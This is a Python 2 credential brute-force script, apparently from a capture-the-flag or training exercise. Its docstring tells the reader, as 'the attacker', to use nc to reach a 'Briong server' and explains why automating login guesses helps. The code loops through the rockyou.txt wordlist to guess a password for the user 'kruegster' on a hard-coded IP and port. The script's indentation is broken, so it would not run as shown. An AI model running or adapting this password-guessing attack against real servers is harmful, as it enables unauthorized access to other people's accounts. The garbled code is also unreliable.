"""
    If you know the IP address of the Briong server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""
import socket
import re
import sys

host = '142.93.117.193'
port = 1337
wordlist= "/Downloads/rockyou.txt"

def brute_force(username,pswd):

    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "Trying "+username+": "+pswd
    s.connect((host,port))
    data = s.recv(1024)
    	print(str(data))
    s.send(username + '\n')
    data = s.recv(1024)
    	print(str(data))
    s.send(pswd + '\n')
    data = s.recv(1024)
    	print(str(data))
    s.close()
    return str(data)
username = "kruegster"

with open("rockyou.txt") as f:
    for pswd in f:
            	result = brute_force(username, pswd)
            	print(result)
   	 if "Fail" not in result:
   		 print "Password Found: "+pswd
   		 sys.exit(0)
